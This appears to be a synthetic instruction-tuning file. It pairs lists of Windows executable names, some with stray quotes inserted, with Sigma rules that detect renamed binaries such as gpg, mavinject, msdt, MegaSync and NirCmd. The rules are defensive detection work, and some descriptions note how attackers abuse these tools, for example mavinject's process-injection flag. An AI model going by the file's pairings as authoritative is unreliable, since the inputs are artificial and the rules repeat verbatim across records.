{"instruction": "Write Sigma rule to detect payload:", "input": "gpg.exe \\gpg.exe \"\\gpg2.exe\"", "output": "title: Renamed Gpg.EXE Execution\nid: ec0722a3-eb5c-4a56-8ab2-bf6f20708592\nstatus: test\ndescription: Detects the execution of a renamed \"gpg.exe\". Often used by ransomware and loaders to decrypt/encrypt data.\nreferences:\n    - https://securelist.com/locked-out/68960/\nauthor: Nasreddine Bencherchali (Nextron Systems), frack113\ndate: 2023-08-09\ntags:\n    - attack.impact\n    - attack.t1486\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'gpg.exe'\n    filter_main_img:\n        Image|endswith:\n            - '\\gpg.exe'\n            - '\\gpg2.exe'\n    condition: selection and not 1 of filter_main_*\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "gpg \\gpg \\gpg2", "output": "title: Renamed Gpg.EXE Execution\nid: ec0722a3-eb5c-4a56-8ab2-bf6f20708592\nstatus: test\ndescription: Detects the execution of a renamed \"gpg.exe\". Often used by ransomware and loaders to decrypt/encrypt data.\nreferences:\n    - https://securelist.com/locked-out/68960/\nauthor: Nasreddine Bencherchali (Nextron Systems), frack113\ndate: 2023-08-09\ntags:\n    - attack.impact\n    - attack.t1486\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'gpg.exe'\n    filter_main_img:\n        Image|endswith:\n            - '\\gpg.exe'\n            - '\\gpg2.exe'\n    condition: selection and not 1 of filter_main_*\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "gpg.exe \\gpg2.exe \\gpg.exe", "output": "title: Renamed Gpg.EXE Execution\nid: ec0722a3-eb5c-4a56-8ab2-bf6f20708592\nstatus: test\ndescription: Detects the execution of a renamed \"gpg.exe\". Often used by ransomware and loaders to decrypt/encrypt data.\nreferences:\n    - https://securelist.com/locked-out/68960/\nauthor: Nasreddine Bencherchali (Nextron Systems), frack113\ndate: 2023-08-09\ntags:\n    - attack.impact\n    - attack.t1486\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'gpg.exe'\n    filter_main_img:\n        Image|endswith:\n            - '\\gpg.exe'\n            - '\\gpg2.exe'\n    condition: selection and not 1 of filter_main_*\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\jusched.exe", "output": "title: Renamed Jusched.EXE Execution\nid: edd8a48c-1b9f-4ba1-83aa-490338cd1ccb\nstatus: test\ndescription: Detects the execution of a renamed \"jusched.exe\" as seen used by the cobalt group\nreferences:\n    - https://www.bitdefender.com/files/News/CaseStudies/study/262/Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf\nauthor: Markus Neis, Swisscom\ndate: 2019-06-04\nmodified: 2023-02-03\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description:\n            - Java Update Scheduler\n            - Java(TM) Update Scheduler\n    filter:\n        Image|endswith: '\\jusched.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\jusched.exe\\\"", "output": "title: Renamed Jusched.EXE Execution\nid: edd8a48c-1b9f-4ba1-83aa-490338cd1ccb\nstatus: test\ndescription: Detects the execution of a renamed \"jusched.exe\" as seen used by the cobalt group\nreferences:\n    - https://www.bitdefender.com/files/News/CaseStudies/study/262/Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf\nauthor: Markus Neis, Swisscom\ndate: 2019-06-04\nmodified: 2023-02-03\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description:\n            - Java Update Scheduler\n            - Java(TM) Update Scheduler\n    filter:\n        Image|endswith: '\\jusched.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\jusched", "output": "title: Renamed Jusched.EXE Execution\nid: edd8a48c-1b9f-4ba1-83aa-490338cd1ccb\nstatus: test\ndescription: Detects the execution of a renamed \"jusched.exe\" as seen used by the cobalt group\nreferences:\n    - https://www.bitdefender.com/files/News/CaseStudies/study/262/Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf\nauthor: Markus Neis, Swisscom\ndate: 2019-06-04\nmodified: 2023-02-03\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description:\n            - Java Update Scheduler\n            - Java(TM) Update Scheduler\n    filter:\n        Image|endswith: '\\jusched.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\jusched.exe", "output": "title: Renamed Jusched.EXE Execution\nid: edd8a48c-1b9f-4ba1-83aa-490338cd1ccb\nstatus: test\ndescription: Detects the execution of a renamed \"jusched.exe\" as seen used by the cobalt group\nreferences:\n    - https://www.bitdefender.com/files/News/CaseStudies/study/262/Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf\nauthor: Markus Neis, Swisscom\ndate: 2019-06-04\nmodified: 2023-02-03\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description:\n            - Java Update Scheduler\n            - Java(TM) Update Scheduler\n    filter:\n        Image|endswith: '\\jusched.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "mavinject32.exe mavinject64.exe \\mavinject32.exe \\mavinject64.exe", "output": "title: Renamed Mavinject.EXE Execution\nid: e6474a1b-5390-49cd-ab41-8d88655f7394\nstatus: test\ndescription: Detects the execution of a renamed version of the \"Mavinject\" process. Which can be abused to perform process injection using the \"/INJECTRUNNING\" flag\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.004/T1056.004.md\n    - https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e\n    - https://twitter.com/gN3mes1s/status/941315826107510784\n    - https://reaqta.com/2017/12/mavinject-microsoft-injector/\n    - https://twitter.com/Hexacorn/status/776122138063409152  # Deleted tweet\n    - https://github.com/SigmaHQ/sigma/issues/3742\n    - https://github.com/keyboardcrunch/SentinelOne-ATTACK-Queries/blob/6a228d23eefe963ca81f2d52f94b815f61ef5ee0/Tactics/DefenseEvasion.md#t1055-process-injection\nauthor: frack113, Florian Roth\ndate: 2022-12-05\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1055.001\n    - attack.t1218.013\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'mavinject32.exe'\n            - 'mavinject64.exe'\n    filter:\n        Image|endswith:\n            - '\\mavinject32.exe'\n            - '\\mavinject64.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "mavinject32.exe \"mavinject64.exe\" \\mavinject32.exe \\mavinject64.exe", "output": "title: Renamed Mavinject.EXE Execution\nid: e6474a1b-5390-49cd-ab41-8d88655f7394\nstatus: test\ndescription: Detects the execution of a renamed version of the \"Mavinject\" process. Which can be abused to perform process injection using the \"/INJECTRUNNING\" flag\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.004/T1056.004.md\n    - https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e\n    - https://twitter.com/gN3mes1s/status/941315826107510784\n    - https://reaqta.com/2017/12/mavinject-microsoft-injector/\n    - https://twitter.com/Hexacorn/status/776122138063409152  # Deleted tweet\n    - https://github.com/SigmaHQ/sigma/issues/3742\n    - https://github.com/keyboardcrunch/SentinelOne-ATTACK-Queries/blob/6a228d23eefe963ca81f2d52f94b815f61ef5ee0/Tactics/DefenseEvasion.md#t1055-process-injection\nauthor: frack113, Florian Roth\ndate: 2022-12-05\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1055.001\n    - attack.t1218.013\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'mavinject32.exe'\n            - 'mavinject64.exe'\n    filter:\n        Image|endswith:\n            - '\\mavinject32.exe'\n            - '\\mavinject64.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "mavinject32 mavinject64 \\mavinject32 \\mavinject64", "output": "title: Renamed Mavinject.EXE Execution\nid: e6474a1b-5390-49cd-ab41-8d88655f7394\nstatus: test\ndescription: Detects the execution of a renamed version of the \"Mavinject\" process. Which can be abused to perform process injection using the \"/INJECTRUNNING\" flag\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.004/T1056.004.md\n    - https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e\n    - https://twitter.com/gN3mes1s/status/941315826107510784\n    - https://reaqta.com/2017/12/mavinject-microsoft-injector/\n    - https://twitter.com/Hexacorn/status/776122138063409152  # Deleted tweet\n    - https://github.com/SigmaHQ/sigma/issues/3742\n    - https://github.com/keyboardcrunch/SentinelOne-ATTACK-Queries/blob/6a228d23eefe963ca81f2d52f94b815f61ef5ee0/Tactics/DefenseEvasion.md#t1055-process-injection\nauthor: frack113, Florian Roth\ndate: 2022-12-05\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1055.001\n    - attack.t1218.013\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'mavinject32.exe'\n            - 'mavinject64.exe'\n    filter:\n        Image|endswith:\n            - '\\mavinject32.exe'\n            - '\\mavinject64.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "mavinject32.exe \\mavinject32.exe mavinject64.exe \\mavinject64.exe", "output": "title: Renamed Mavinject.EXE Execution\nid: e6474a1b-5390-49cd-ab41-8d88655f7394\nstatus: test\ndescription: Detects the execution of a renamed version of the \"Mavinject\" process. Which can be abused to perform process injection using the \"/INJECTRUNNING\" flag\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.004/T1056.004.md\n    - https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e\n    - https://twitter.com/gN3mes1s/status/941315826107510784\n    - https://reaqta.com/2017/12/mavinject-microsoft-injector/\n    - https://twitter.com/Hexacorn/status/776122138063409152  # Deleted tweet\n    - https://github.com/SigmaHQ/sigma/issues/3742\n    - https://github.com/keyboardcrunch/SentinelOne-ATTACK-Queries/blob/6a228d23eefe963ca81f2d52f94b815f61ef5ee0/Tactics/DefenseEvasion.md#t1055-process-injection\nauthor: frack113, Florian Roth\ndate: 2022-12-05\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1055.001\n    - attack.t1218.013\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'mavinject32.exe'\n            - 'mavinject64.exe'\n    filter:\n        Image|endswith:\n            - '\\mavinject32.exe'\n            - '\\mavinject64.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "megasync.exe \\megasync.exe", "output": "title: Renamed MegaSync Execution\nid: 643bdcac-8b82-49f4-9fd9-25a90b929f3b\nstatus: test\ndescription: Detects the execution of a renamed MegaSync.exe as seen used by ransomware families like Nefilim, Sodinokibi, Pysa, and Conti.\nreferences:\n    - https://redcanary.com/blog/rclone-mega-extortion/\nauthor: Sittikorn S\ndate: 2021-06-22\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        OriginalFileName: 'megasync.exe'\n    filter:\n        Image|endswith: '\\megasync.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Software that illegally integrates MegaSync in a renamed form\n    - Administrators that have renamed MegaSync\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "megasync.exe \"\\megasync.exe\"", "output": "title: Renamed MegaSync Execution\nid: 643bdcac-8b82-49f4-9fd9-25a90b929f3b\nstatus: test\ndescription: Detects the execution of a renamed MegaSync.exe as seen used by ransomware families like Nefilim, Sodinokibi, Pysa, and Conti.\nreferences:\n    - https://redcanary.com/blog/rclone-mega-extortion/\nauthor: Sittikorn S\ndate: 2021-06-22\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        OriginalFileName: 'megasync.exe'\n    filter:\n        Image|endswith: '\\megasync.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Software that illegally integrates MegaSync in a renamed form\n    - Administrators that have renamed MegaSync\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "megasync \\megasync", "output": "title: Renamed MegaSync Execution\nid: 643bdcac-8b82-49f4-9fd9-25a90b929f3b\nstatus: test\ndescription: Detects the execution of a renamed MegaSync.exe as seen used by ransomware families like Nefilim, Sodinokibi, Pysa, and Conti.\nreferences:\n    - https://redcanary.com/blog/rclone-mega-extortion/\nauthor: Sittikorn S\ndate: 2021-06-22\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        OriginalFileName: 'megasync.exe'\n    filter:\n        Image|endswith: '\\megasync.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Software that illegally integrates MegaSync in a renamed form\n    - Administrators that have renamed MegaSync\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "megasync.exe \\megasync.exe", "output": "title: Renamed MegaSync Execution\nid: 643bdcac-8b82-49f4-9fd9-25a90b929f3b\nstatus: test\ndescription: Detects the execution of a renamed MegaSync.exe as seen used by ransomware families like Nefilim, Sodinokibi, Pysa, and Conti.\nreferences:\n    - https://redcanary.com/blog/rclone-mega-extortion/\nauthor: Sittikorn S\ndate: 2021-06-22\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        OriginalFileName: 'megasync.exe'\n    filter:\n        Image|endswith: '\\megasync.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Software that illegally integrates MegaSync in a renamed form\n    - Administrators that have renamed MegaSync\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "msdt.exe \\msdt.exe", "output": "title: Renamed Msdt.EXE Execution\nid: bd1c6866-65fc-44b2-be51-5588fcff82b9\nstatus: test\ndescription: Detects the execution of a renamed \"Msdt.exe\" binary\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Msdt/\nauthor: pH-T (Nextron Systems)\ndate: 2022-06-03\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'msdt.exe'\n    filter:\n        Image|endswith: '\\msdt.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "msdt.exe \"\\msd\"t.exe", "output": "title: Renamed Msdt.EXE Execution\nid: bd1c6866-65fc-44b2-be51-5588fcff82b9\nstatus: test\ndescription: Detects the execution of a renamed \"Msdt.exe\" binary\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Msdt/\nauthor: pH-T (Nextron Systems)\ndate: 2022-06-03\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'msdt.exe'\n    filter:\n        Image|endswith: '\\msdt.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "msdt \\msdt", "output": "title: Renamed Msdt.EXE Execution\nid: bd1c6866-65fc-44b2-be51-5588fcff82b9\nstatus: test\ndescription: Detects the execution of a renamed \"Msdt.exe\" binary\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Msdt/\nauthor: pH-T (Nextron Systems)\ndate: 2022-06-03\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'msdt.exe'\n    filter:\n        Image|endswith: '\\msdt.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "msdt.exe \\msdt.exe", "output": "title: Renamed Msdt.EXE Execution\nid: bd1c6866-65fc-44b2-be51-5588fcff82b9\nstatus: test\ndescription: Detects the execution of a renamed \"Msdt.exe\" binary\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Msdt/\nauthor: pH-T (Nextron Systems)\ndate: 2022-06-03\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'msdt.exe'\n    filter:\n        Image|endswith: '\\msdt.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "msteams.exe teams.exe \\msteams.exe \\teams.exe", "output": "title: Renamed Microsoft Teams Execution\nid: 88f46b67-14d4-4f45-ac2c-d66984f22191\nstatus: test\ndescription: Detects the execution of a renamed Microsoft Teams binary.\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-07-12\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'msteams.exe'\n            - 'teams.exe'\n    filter_main_legit_names:\n        Image|endswith:\n            - '\\msteams.exe'\n            - '\\teams.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "msteams.exe teams.exe \\mstea\\\"ms.exe\\\" \\teams.exe", "output": "title: Renamed Microsoft Teams Execution\nid: 88f46b67-14d4-4f45-ac2c-d66984f22191\nstatus: test\ndescription: Detects the execution of a renamed Microsoft Teams binary.\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-07-12\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'msteams.exe'\n            - 'teams.exe'\n    filter_main_legit_names:\n        Image|endswith:\n            - '\\msteams.exe'\n            - '\\teams.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "msteams teams \\msteams \\teams", "output": "title: Renamed Microsoft Teams Execution\nid: 88f46b67-14d4-4f45-ac2c-d66984f22191\nstatus: test\ndescription: Detects the execution of a renamed Microsoft Teams binary.\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-07-12\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'msteams.exe'\n            - 'teams.exe'\n    filter_main_legit_names:\n        Image|endswith:\n            - '\\msteams.exe'\n            - '\\teams.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "msteams.exe teams.exe \\teams.exe \\msteams.exe", "output": "title: Renamed Microsoft Teams Execution\nid: 88f46b67-14d4-4f45-ac2c-d66984f22191\nstatus: test\ndescription: Detects the execution of a renamed Microsoft Teams binary.\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-07-12\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'msteams.exe'\n            - 'teams.exe'\n    filter_main_legit_names:\n        Image|endswith:\n            - '\\msteams.exe'\n            - '\\teams.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "NirCmd.exe \\nircmd.exe \\nircmdc.exe", "output": "title: Renamed NirCmd.EXE Execution\nid: 264982dc-dbad-4dce-b707-1e0d3e0f73d9\nstatus: test\ndescription: Detects the execution of a renamed \"NirCmd.exe\" binary based on the PE metadata fields.\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/\n    - https://www.nirsoft.net/utils/nircmd.html\nauthor: X__Junior (Nextron Systems)\ndate: 2024-03-11\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'NirCmd.exe'\n    filter_main_img:\n        Image|endswith:\n            - '\\nircmd.exe'\n            - '\\nircmdc.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "NirCmd.exe \\nirc\\\"md.exe\\\" \\nircmdc.exe", "output": "title: Renamed NirCmd.EXE Execution\nid: 264982dc-dbad-4dce-b707-1e0d3e0f73d9\nstatus: test\ndescription: Detects the execution of a renamed \"NirCmd.exe\" binary based on the PE metadata fields.\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/\n    - https://www.nirsoft.net/utils/nircmd.html\nauthor: X__Junior (Nextron Systems)\ndate: 2024-03-11\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'NirCmd.exe'\n    filter_main_img:\n        Image|endswith:\n            - '\\nircmd.exe'\n            - '\\nircmdc.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "NirCmd \\nircmd \\nircmdc", "output": "title: Renamed NirCmd.EXE Execution\nid: 264982dc-dbad-4dce-b707-1e0d3e0f73d9\nstatus: test\ndescription: Detects the execution of a renamed \"NirCmd.exe\" binary based on the PE metadata fields.\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/\n    - https://www.nirsoft.net/utils/nircmd.html\nauthor: X__Junior (Nextron Systems)\ndate: 2024-03-11\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'NirCmd.exe'\n    filter_main_img:\n        Image|endswith:\n            - '\\nircmd.exe'\n            - '\\nircmdc.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "NirCmd.exe \\nircmd.exe \\nircmdc.exe", "output": "title: Renamed NirCmd.EXE Execution\nid: 264982dc-dbad-4dce-b707-1e0d3e0f73d9\nstatus: test\ndescription: Detects the execution of a renamed \"NirCmd.exe\" binary based on the PE metadata fields.\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/\n    - https://www.nirsoft.net/utils/nircmd.html\nauthor: X__Junior (Nextron Systems)\ndate: 2024-03-11\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'NirCmd.exe'\n    filter_main_img:\n        Image|endswith:\n            - '\\nircmd.exe'\n            - '\\nircmdc.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Microsoft.NodejsTools.PressAnyKey.exe \\Microsoft.NodejsTools.PressAnyKey.exe", "output": "title: Visual Studio NodejsTools PressAnyKey Renamed Execution\nid: 65c3ca2c-525f-4ced-968e-246a713d164f\nrelated:\n    - id: a20391f8-76fb-437b-abc0-dba2df1952c6\n      type: similar\nstatus: test\ndescription: Detects renamed execution of \"Microsoft.NodejsTools.PressAnyKey.exe\", which can be abused as a LOLBIN to execute arbitrary binaries\nreferences:\n    - https://twitter.com/mrd0x/status/1463526834918854661\n    - https://gist.github.com/nasbench/a989ce64cefa8081bd50cf6ad8c491b5\nauthor: Nasreddine Bencherchali (Nextron Systems), Florian Roth (Nextron Systems)\ndate: 2023-04-11\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'Microsoft.NodejsTools.PressAnyKey.exe'\n    filter_main_legit_name:\n        Image|endswith: '\\Microsoft.NodejsTools.PressAnyKey.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Microsoft.NodejsTools.PressAnyKey.exe \\Microsoft.NodejsTo\\\"ols.PressAnyKey.exe\\\"", "output": "title: Visual Studio NodejsTools PressAnyKey Renamed Execution\nid: 65c3ca2c-525f-4ced-968e-246a713d164f\nrelated:\n    - id: a20391f8-76fb-437b-abc0-dba2df1952c6\n      type: similar\nstatus: test\ndescription: Detects renamed execution of \"Microsoft.NodejsTools.PressAnyKey.exe\", which can be abused as a LOLBIN to execute arbitrary binaries\nreferences:\n    - https://twitter.com/mrd0x/status/1463526834918854661\n    - https://gist.github.com/nasbench/a989ce64cefa8081bd50cf6ad8c491b5\nauthor: Nasreddine Bencherchali (Nextron Systems), Florian Roth (Nextron Systems)\ndate: 2023-04-11\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'Microsoft.NodejsTools.PressAnyKey.exe'\n    filter_main_legit_name:\n        Image|endswith: '\\Microsoft.NodejsTools.PressAnyKey.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Microsoft.NodejsTools.PressAnyKey \\Microsoft.NodejsTools.PressAnyKey", "output": "title: Visual Studio NodejsTools PressAnyKey Renamed Execution\nid: 65c3ca2c-525f-4ced-968e-246a713d164f\nrelated:\n    - id: a20391f8-76fb-437b-abc0-dba2df1952c6\n      type: similar\nstatus: test\ndescription: Detects renamed execution of \"Microsoft.NodejsTools.PressAnyKey.exe\", which can be abused as a LOLBIN to execute arbitrary binaries\nreferences:\n    - https://twitter.com/mrd0x/status/1463526834918854661\n    - https://gist.github.com/nasbench/a989ce64cefa8081bd50cf6ad8c491b5\nauthor: Nasreddine Bencherchali (Nextron Systems), Florian Roth (Nextron Systems)\ndate: 2023-04-11\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'Microsoft.NodejsTools.PressAnyKey.exe'\n    filter_main_legit_name:\n        Image|endswith: '\\Microsoft.NodejsTools.PressAnyKey.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
